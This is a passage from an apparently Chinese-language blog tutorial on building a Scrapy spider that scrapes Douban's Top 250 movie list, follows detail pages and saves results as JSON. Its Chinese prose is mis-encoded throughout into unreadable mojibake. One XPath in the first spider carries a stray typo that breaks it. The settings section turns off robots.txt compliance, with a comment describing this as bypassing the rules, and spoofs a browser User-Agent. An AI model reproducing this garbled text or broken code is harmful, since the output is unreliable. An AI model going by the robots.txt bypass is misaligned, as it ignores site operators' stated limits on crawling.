id="åˆ›å»ºé¡¹ç›®">åˆ›å»ºé¡¹ç›®</h2><p>åˆ›å»ºscrpyé¡¹ç›®çš„å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy startproject &lt;é¡¹ç›®åå­—&gt;</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy startproject myspider</span><br></pre></td></tr></table></figure><h2 id="åˆ›å»ºçˆ¬è™«">åˆ›å»ºçˆ¬è™«</h2><div class="note info flat"><p>é€šè¿‡å‘½ä»¤åˆ›å»ºå‡ºçˆ¬è™«æ–‡ä»¶ï¼Œçˆ¬è™«æ–‡ä»¶ä¸ºä¸»è¦çš„ä»£ç ä½œä¸šæ–‡ä»¶ï¼Œé€šå¸¸ä¸€ä¸ªç½‘ç«™çš„çˆ¬å–åŠ¨ä½œéƒ½ä¼šåœ¨çˆ¬è™«æ–‡ä»¶ä¸­è¿›è¡Œç¼–å†™ã€‚</p></div><p>å‘½ä»¤ï¼šåœ¨<strong>é¡¹ç›®è·¯å¾„ä¸‹</strong>æ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy genspider &lt;çˆ¬è™«åå­—&gt; &lt;å…è®¸çˆ¬å–çš„åŸŸå&gt;</span><br></pre></td></tr></table></figure><ul><li>çˆ¬è™«åå­—ï¼šä½œä¸ºçˆ¬è™«è¿è¡Œæ—¶çš„å‚æ•°</li><li>å…è®¸çˆ¬å–çš„åŸŸåï¼šä¸ºå¯¹äºçˆ¬è™«è®¾ç½®çš„çˆ¬å–èŒƒå›´ï¼Œè®¾ç½®ä¹‹åç”¨äºè¿‡æ»¤è¦çˆ¬å–çš„urlï¼Œå¦‚æœçˆ¬å–çš„urlä¸å…è®¸çš„åŸŸä¸é€šåˆ™è¢«è¿‡æ»¤æ‰ã€‚å¦‚ä¸ç¡®å®šæ—¶ï¼Œ<a href="http://xn--xx-hf3c34q0p7dlpp.com">å¯ä»¥è®¾ç½®xx.com</a>ï¼ŒåæœŸå†è¿›è¡Œä¿®æ”¹ã€‚</li></ul><p>è¿™é‡Œæˆ‘ä»¬ä»¥<code>è±†ç“£ç”µå½±Top250</code>ä½œä¸ºç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd myspider</span><br><span class="line">scrapy genspider douban movie.douban.com</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆçš„ç›®å½•å’Œæ–‡ä»¶ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%80%BB%E8%A7%88.5z4b3r667x00.jpg" alt="ç›®å½•æ–‡ä»¶æ€»è§ˆ"></p><h2 id="å®Œå–„çˆ¬è™«">å®Œå–„çˆ¬è™«</h2><p>åœ¨ä¸Šä¸€æ­¥ç”Ÿæˆå‡ºæ¥çš„çˆ¬è™«æ–‡ä»¶ä¸­ç¼–å†™æŒ‡å®šç½‘ç«™çš„æ•°æ®é‡‡é›†æ“ä½œï¼Œå®ç°æ•°æ®æå–</p><p><strong>ä¸€ã€åœ¨item.pyä¸­å®šä¹‰è¦æå–çš„å­—æ®µ</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyspiderItem</span>(<span class="params">scrapy.Item</span>):</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    num = scrapy.Field()<span class="comment"># ç”µå½±åºå·   </span></span><br><span class="line">    name = scrapy.Field()<span class="comment"># ç”µå½±åå­—</span></span><br><span class="line">    score = scrapy.Field()<span class="comment"># ç”µå½±è¯„åˆ†   </span></span><br><span class="line">    con = scrapy.Field()<span class="comment"># ç”µå½±ç®€ä»‹</span></span><br></pre></td></tr></table></figure><p><strong>äºŒã€åœ¨/myspider/myspider/spiders/douban.py ä¸­ä¿®æ”¹å†…å®¹å¦‚ä¸‹</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> ..items <span class="keyword">import</span> MyspiderItem</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubanSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;douban&#x27;</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;movie.douban.com&#x27;</span>]</span><br><span class="line">    start_urls = [<span class="string">&#x27;http://movie.douban.com/top250&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        <span class="comment"># ç”µå½±åå­—</span></span><br><span class="line">        name = response.xpath(<span class="string">&#x27;.//div[@id=&quot;content&quot;]/div/div/ol/li[*]/div/div/div/a/span[1]/text()&#x27;</span>).getall()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ç”µå½±è¯„åˆ†</span></span><br><span class="line">        score = response.xpath(<span class="string">&#x27;.//*[@id=&quot;content&quot;]/div/div[1]s/ol/li[*]/div/div/div/div/span[3]/@content&#x27;</span>).getall()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ç¾åŒ–æ ¼å¼</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">            <span class="comment">#åœ¨çˆ¬è™«ä¸­å¯¼å…¥å¹¶ä¸”å®ä¾‹åŒ–å¯¹è±¡, ä½¿ç”¨æ–¹æ³•è·Ÿä½¿ç”¨å­—å…¸ç±»ä¼¼</span></span><br><span class="line">            item = MyspiderItem()</span><br><span class="line">            item[<span class="string">&#x27;name&#x27;</span>] = name[i]<span class="comment"># è¿™é‡Œçš„é”®åè¦è·Ÿitem.pyä¸­å­—æ®µåä¸€è‡´</span></span><br><span class="line">            item[<span class="string">&#x27;score&#x27;</span>] = score[i]</span><br><span class="line">            <span class="built_in">print</span>(item)</span><br><span class="line">            <span class="keyword">yield</span> item      <span class="comment"># yield ä¼šæŠŠæ•°æ®ä¼ ç»™ç®¡é“</span></span><br></pre></td></tr></table></figure><div class="note warning no-icon flat"><p>æ³¨æ„ï¼š</p><ul><li>scrapy.Spiderçˆ¬è™«ç±»ä¸­å¿…é¡»æœ‰åä¸ºparseçš„è§£æ</li><li>å¦‚æœç½‘ç«™ç»“æ„å±‚æ¬¡æ¯”è¾ƒå¤æ‚ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰å…¶ä»–è§£æå‡½æ•°</li><li>åœ¨è§£æå‡½æ•°ä¸­æå–çš„urlåœ°å€å¦‚æœè¦å‘é€è¯·æ±‚ï¼Œåˆ™å¿…é¡»å±äºallowed_domainsèŒƒå›´å†…ï¼Œä½†æ˜¯start_urlsä¸­çš„urlåœ° å€ä¸å—è¿™ä¸ªé™åˆ¶ï¼Œæˆ‘ä»¬ä¼šåœ¨åç»­çš„è¯¾ç¨‹ä¸­å­¦ä¹ å¦‚ä½•åœ¨è§£æå‡½æ•°ä¸­æ„é€ å‘é€è¯·æ±‚</li><li>å¯åŠ¨çˆ¬è™«çš„æ—¶å€™æ³¨æ„å¯åŠ¨çš„ä½ç½®ï¼Œæ˜¯åœ¨é¡¹ç›®è·¯å¾„ä¸‹å¯åŠ¨</li><li>parse()å‡½æ•°ä¸­ä½¿ç”¨yieldè¿”å›æ•°æ®ï¼Œæ³¨æ„ï¼šè§£æå‡½æ•°ä¸­çš„yieldèƒ½å¤Ÿä¼ é€’çš„å¯¹è±¡åªèƒ½æ˜¯ï¼šBaseItem, Request, dict, None</li></ul></div><p><strong>ä¸‰ã€å®šä½å…ƒç´ ä»¥åŠæå–æ•°æ®ã€å±æ€§å€¼çš„æ–¹æ³•</strong></p><div class="note info flat"><p>è§£æå¹¶è·å–scrapyçˆ¬è™«ä¸­çš„æ•°æ®: åˆ©ç”¨xpathè§„åˆ™å­—ç¬¦ä¸²è¿›è¡Œå®šä½å’Œæå–</p></div><ol><li><p>response.xpathæ–¹æ³•çš„è¿”å›ç»“æœæ˜¯ä¸€ä¸ªç±»ä¼¼listçš„ç±»å‹ï¼Œå…¶ä¸­åŒ…å«çš„æ˜¯selectorå¯¹è±¡ï¼Œæ“ä½œå’Œåˆ—è¡¨ä¸€æ ·ï¼Œä½†æ˜¯æœ‰ ä¸€äº›é¢å¤–çš„æ–¹æ³•</p></li><li><p>é¢å¤–æ–¹æ³•extract()ï¼šè¿”å›ä¸€ä¸ªåŒ…å«æœ‰å­—ç¬¦ä¸²çš„åˆ—è¡¨ï¼ˆç›¸å½“äºgetall() ï¼‰</p></li><li><p>é¢å¤–æ–¹æ³•extract_first()ï¼šè¿”å›åˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œåˆ—è¡¨ä¸ºç©ºæ²¡æœ‰è¿”å›Noneï¼ˆç›¸å½“äºget() ï¼‰</p></li></ol><p><strong>å››ã€responseå“åº”å¯¹è±¡çš„å¸¸ç”¨å±æ€§</strong></p><ul><li>response.urlï¼šå½“å‰å“åº”çš„urlåœ°å€</li><li>response.request.urlï¼šå½“å‰å“åº”å¯¹åº”çš„è¯·æ±‚çš„urlåœ°å€</li><li>response.headersï¼šå“åº”å¤´</li><li>response.requests.headersï¼šå½“å‰å“åº”çš„è¯·æ±‚å¤´</li><li>response.bodyï¼šå“åº”ä½“ï¼Œä¹Ÿå°±æ˜¯htmlä»£ç ï¼Œbyteç±»å‹</li><li>response.statusï¼šå“åº”çŠ¶æ€ç </li></ul><p><strong>äº”ã€ï¼ˆæ”¹è¿›ç‰ˆï¼‰å¯æ„é€ Requestå¯¹è±¡ï¼Œå¹¶å‘é€è¯·æ±‚</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> ..items <span class="keyword">import</span> MyspiderItem</span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span>     <span class="comment"># å…¨å±€å˜é‡</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubanSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;douban&#x27;</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;movie.douban.com&#x27;</span>]</span><br><span class="line">    start_urls = [<span class="string">&#x27;http://movie.douban.com/top250&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        <span class="comment"># ç”µå½±åå­—</span></span><br><span class="line">        name = response.xpath(<span class="string">&#x27;.//div[@id=&quot;content&quot;]/div/div/ol/li[*]/div/div/div/a/span[1]/text()&#x27;</span>).getall()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ç”µå½±è¯„åˆ†</span></span><br><span class="line">        score = response.xpath(<span class="string">&#x27;.//*[@id=&quot;content&quot;]/div/div[1]/ol/li[*]/div/div/div/div/span[2]/text()&#x27;</span>).getall()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ç”µå½±é“¾æ¥</span></span><br><span class="line">        link = response.xpath(<span class="string">&#x27;.//*[@id=&quot;content&quot;]/div/div[1]/ol/li[*]/div/div[2]/div[1]/a/@href&#x27;</span>).getall()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ç¾åŒ–æ ¼å¼</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">            item = MyspiderItem()</span><br><span class="line">            <span class="keyword">global</span> num</span><br><span class="line">            <span class="keyword">if</span> num == i:        <span class="comment"># é˜²æ­¢ä¹±åº</span></span><br><span class="line">                item[<span class="string">&#x27;num&#x27;</span>] = num+<span class="number">1</span></span><br><span class="line">                item[<span class="string">&#x27;name&#x27;</span>] = name[i]</span><br><span class="line">                item[<span class="string">&#x27;score&#x27;</span>] = score[i]</span><br><span class="line">                <span class="comment"># print(item)</span></span><br><span class="line">                <span class="comment"># yield item      # yield ä¼šæŠŠæ•°æ®ä¼ ç»™ç®¡é“</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># print(link[i])</span></span><br><span class="line">                <span class="comment"># å¯¹è·å–çš„ç”µå½±é“¾æ¥å»å‘é€è¯·æ±‚</span></span><br><span class="line">                <span class="keyword">yield</span> scrapy.Request(link[i], callback=self.parse_data, meta=&#123;<span class="string">&#x27;item2&#x27;</span>: item&#125;)</span><br><span class="line">                num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># ç¿»é¡µæ“ä½œä¸€</span></span><br><span class="line">        next_url = response.xpath(<span class="string">&#x27;.//*[@id=&quot;content&quot;]/div/div[1]/div[2]/span[3]/a/@href&#x27;</span>).get()</span><br><span class="line">        <span class="comment"># æ‹¼æ¥</span></span><br><span class="line">        next_url = <span class="string">&#x27;https://movie.douban.com/top250&#x27;</span> + next_url</span><br><span class="line"></span><br><span class="line">        <span class="comment"># # ç¿»é¡µæ“ä½œäºŒ</span></span><br><span class="line">        <span class="comment"># # n_url = response.xpath(&quot;//a[text()=&#x27;åé¡µ&gt;&#x27;]/@href&quot;)</span></span><br><span class="line">        <span class="comment"># # ç›´æ¥ä½¿ç”¨responseæºå¸¦æ®‹ç¼ºçš„url</span></span><br><span class="line">        <span class="comment"># # yield response.follow(n_url, callback=self.parse)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ‰‹åŠ¨æ„é€ è¯·æ±‚å¯¹è±¡ï¼ŒæŒ‡å®šè§£æèµ·å§‹urlçš„parseæ–¹æ³•</span></span><br><span class="line">        <span class="comment"># yield scrapy.Request(next_url, callback=self.parse)   # æ•°æ®è¿‡å¤šï¼Œé˜²æ­¢è¢«åçˆ¬ï¼Œå…ˆæ³¨é‡Šæ‰  </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è§£æè¯¦æƒ…çš„å‡½æ•°(è‡ªå®šä¹‰)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_data</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        item = response.meta.get(<span class="string">&#x27;item2&#x27;</span>)   <span class="comment"># æˆ– item = response.meta[&#x27;item2&#x27;]</span></span><br><span class="line">        <span class="comment"># print(item)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># æå–è¯¦æƒ…ç®€ä»‹</span></span><br><span class="line">        <span class="comment"># æœ‰çš„èŠ‚ç‚¹ä¸ä¸€æ ·ï¼Œæœ‰äº›æ˜¯div/span   æœ‰äº›div/span/span</span></span><br><span class="line">        <span class="comment"># // *[ @ id = &quot;link-report&quot;] / span[1] / text()</span></span><br><span class="line">        <span class="comment"># // *[ @ id = &quot;link-report&quot;] / span[1] / span / text()</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># content = response.xpath(&#x27;//*[@id=&quot;link-report&quot;]/span[1]/span/text()&#x27;).get()</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># string(path) æ–¹æ³•ä¼šæå–çˆ¶æ ‡ç­¾ä¸‹çš„æ–‡æœ¬å†…å®¹</span></span><br><span class="line">        <span class="comment"># path  å°±æ˜¯çˆ¶æ ‡ç­¾çš„è·¯å¾„</span></span><br><span class="line">        content = response.xpath(<span class="string">&#x27;string(.//*[@id=&quot;link-report&quot;]/span)&#x27;</span>).get()</span><br><span class="line">        <span class="comment"># print(&#x27;è¯¦æƒ…:&#x27;, content)</span></span><br><span class="line">        item[<span class="string">&#x27;con&#x27;</span>] = content.strip()  <span class="comment"># strip()å»é™¤å·¦å³ä¸¤è¾¹çš„ç©ºæ ¼</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure><p>scrapy.Request()ä¸­çš„å¸¸è§å‚æ•°è§£é‡Š</p><table><thead><tr><th>å‚æ•°</th><th>è§£é‡Š</th><th>æ˜¯å¦å¿…å¡«</th></tr></thead><tbody><tr><td>url</td><td>è¯·æ±‚çš„url</td><td>æ˜¯</td></tr><tr><td>callback</td><td>å›è°ƒå‡½æ•°ï¼Œç”¨äºæ¥æ”¶è¯·æ±‚åçš„è¿”å›ä¿¡æ¯ï¼Œè‹¥æ²¡æŒ‡å®šï¼Œåˆ™é»˜è®¤ä¸ºparse()å‡½æ•°</td><td>æ˜¯</td></tr><tr><td>meta</td><td>æ–¹æ³•ä¹‹é—´ä»¥å­—å…¸å½¢å¼ä¼ é€’å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°ä¸€èˆ¬ä¹Ÿå¯åœ¨<code>middlewares</code>ä¸­å¤„ç†</td><td>å¦</td></tr><tr><td>method</td><td>httpè¯·æ±‚çš„æ–¹å¼ï¼Œé»˜è®¤ä¸ºGETè¯·æ±‚ï¼Œä¸€èˆ¬ä¸éœ€è¦æŒ‡å®šã€‚è‹¥éœ€è¦POSTè¯·æ±‚ï¼Œå»ºè®®ä½¿ç”¨ç”¨<code>scrapy.FormRequest()</code></td><td>å¦</td></tr><tr><td>headers</td><td>dictç±»å‹ï¼Œè¯·æ±‚å¤´ä¿¡æ¯ï¼Œä¸€èˆ¬åœ¨settingsä¸­è®¾ç½®å³å¯ï¼Œä¹Ÿå¯åœ¨middlewaresä¸­è®¾ç½®</td><td>å¦</td></tr><tr><td>cookies</td><td>dictæˆ–listç±»å‹ï¼Œè¯·æ±‚çš„cookie</td><td>å¦</td></tr><tr><td>dont_filter</td><td>æ˜¯å¦å¼€å¯è¿‡æ»¤ï¼Œé»˜è®¤å…³é—­ï¼Œå¼€å¯ä¹‹åçˆ¬å–è¿‡çš„url,ä¸‹ä¸€æ¬¡ä¸ä¼šå†çˆ¬å–</td><td>å¦</td></tr><tr><td>errback</td><td>æŠ›å‡ºé”™è¯¯çš„å›è°ƒå‡½æ•°å¹¶æ‰“å°å‡ºæ¥ï¼Œé”™è¯¯åŒ…æ‹¬404ï¼Œè¶…æ—¶ï¼ŒDNSé”™è¯¯ç­‰</td><td>å¦</td></tr></tbody></table><div class="note success no-icon flat"><p>å‘é€postè¯·æ±‚</p><p><code>scrapy.FormRequest(urlï¼Œcallback, formdata)</code></p><p>FormRequest ç±»ä¸ºRequestçš„å­ç±»ï¼Œç”¨äºPOSTè¯·æ±‚ï¼Œå…¶ä»–å‚æ•°ä¸Requestä¸€æ ·ï¼Œå…¶ä¸­æ–°å¢çš„<code>formdata</code>æ˜¯dictç±»å‹ï¼Œç›¸å½“äºmetaã€‚</p></div><h2 id="ä¿å­˜æ•°æ®">ä¿å­˜æ•°æ®</h2><div class="note info flat"><p>åˆ©ç”¨ç®¡é“pipelineæ¥å¤„ç†ï¼ˆä¿å­˜ï¼‰æ•°æ®</p></div><p><strong>ä¸€ã€åœ¨pipelines.pyæ–‡ä»¶ä¸­å®šä¹‰å¯¹æ•°æ®çš„æ“ä½œ</strong></p><ol><li>å®šä¹‰ä¸€ä¸ªç®¡é“ç±»</li><li>é‡å†™ç®¡é“ç±»çš„process_itemæ–¹æ³•</li><li>process_itemæ–¹æ³•å¤„ç†å®Œitemä¹‹åå¿…é¡»è¿”å›ç»™å¼•æ“</li><li>å®šä¹‰æ•°æ®çš„ä¿å­˜é€»è¾‘</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyspiderPipeline</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span>(<span class="params">self, spider</span>):</span></span><br><span class="line">        self.file = <span class="built_in">open</span>(<span class="string">&#x27;douban.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line">        <span class="comment"># with open(&#x27;douban250.txt&#x27;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span></span><br><span class="line">        <span class="comment">#     f.write(str(item) + &#x27;\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># æŠŠä¼ é€’æ•°æ®çš„è½½ä½“itemå¯¹è±¡è½¬ä¸ºä¸€ä¸ªå­—å…¸</span></span><br><span class="line">        dic = <span class="built_in">dict</span>(item)</span><br><span class="line">        js_data = json.dumps(dic, ensure_ascii=<span class="literal">False</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        self.file.write(js_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_spider</span>(<span class="params">self, spider</span>):</span></span><br><span class="line">        self.file.close()</span><br></pre></td></tr></table></figure><ul><li>def open_spider(self, spider) â€”â€” çˆ¬è™«<code>å¼€å¯</code>æ—¶æ‰§è¡Œä¸€æ¬¡ï¼Œå¯ç”¨æ¥<code>æ‰“å¼€</code>æ–‡ä»¶</li><li>def process_item(self, item, spider) â€”â€”å®ç°æ•°æ®çš„å†™å…¥æ“ä½œ</li><li>def close_spider(self, spider) â€”â€” çˆ¬è™«<code>å…³é—­</code>æ—¶æ‰§è¡Œä¸€æ¬¡ï¼Œå¯ç”¨æ¥<code>å…³é—­</code>æ–‡ä»¶</li></ul><p><strong>äºŒã€<a href="http://xn--settings-q86n.py">åœ¨settings.py</a> é…ç½®å¯ç”¨ç®¡é“</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯ç”¨ç®¡é“é…ç½®</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">   <span class="string">&#x27;myspider.pipelines.MyspiderPipeline&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»•è¿‡robotsè§„åˆ™ï¼Œç›´æ¥çˆ¬å–é¡µé¢</span></span><br><span class="line"><span class="comment"># Obey robots.txt rules</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ·»åŠ User-agent</span></span><br><span class="line"><span class="comment">#USER_AGENT = &#x27;myspider (+http://www.yourdomain.com)&#x27;</span></span><br><span class="line">USER_AGENT = <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ·»åŠ cookie</span></span><br><span class="line">COOKIES_ENABLED = <span class="literal">False</span></span><br><span class="line">DEFAULT_REQUEST_HEADERS = &#123;</span><br><span class="line">  <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>setting.pyä¸€èˆ¬éƒ½ä¼šå°†<code>ç®¡é“é…ç½®</code>æ³¨é‡Šæ‰ï¼Œå–æ¶ˆæ³¨é‡Šå³å¯ã€‚</p><p>é…ç½®é¡¹ä¸­é”®ä¸ºä½¿ç”¨çš„ç®¡é“ç±»ï¼Œç®¡é“ç±»ä½¿ç”¨<code>.</code>è¿›è¡Œåˆ†å‰²ï¼Œç¬¬ä¸€ä¸ªä¸º<code>é¡¹ç›®ç›®å½•</code>ï¼Œç¬¬äºŒä¸ªä¸º<code>æ–‡ä»¶</code>ï¼Œç¬¬ä¸‰ä¸ªä¸º<code>å®šä¹‰çš„ç®¡é“ç±»</code>ã€‚ é…ç½®é¡¹ä¸­å€¼ä¸ºç®¡é“çš„ä½¿ç”¨é¡ºåºï¼Œè®¾ç½®çš„æ•°å€¼<code>è¶Šå°è¶Šä¼˜å…ˆæ‰§è¡Œ</code>ï¼Œè¯¥å€¼ä¸€èˆ¬è®¾ç½®ä¸º1000ä»¥å†…ã€‚</p><h2 id="è¿è¡Œçˆ¬è™«">è¿è¡Œçˆ¬è™«</h2><p>å‘½ä»¤ï¼šåœ¨<strong>é¡¹ç›®ç›®å½•ä¸‹</strong>æ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl &lt;çˆ¬è™«åå­—&gt;(--nolog)</span><br></pre></td></tr></table></figure><div class="note orange icon flat"><i class="note-icon fas fa-battery-half"></i><p>â€”nologï¼šä¸æ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯ï¼Œä¸åŠ å³é»˜è®¤æ˜¾ç¤º</p></div><p>ç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl douban --nolog</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/è¿è¡Œç»“æœ.5s2ykwcn5bk0.jpg" alt="è¿è¡Œç»“æœ" style="zoom:67%;" /><h2 id="crawlspiderçˆ¬è™«">crawlspiderçˆ¬è™«</h2><p>å›é¡¾ä¹‹å‰çš„ä»£ç 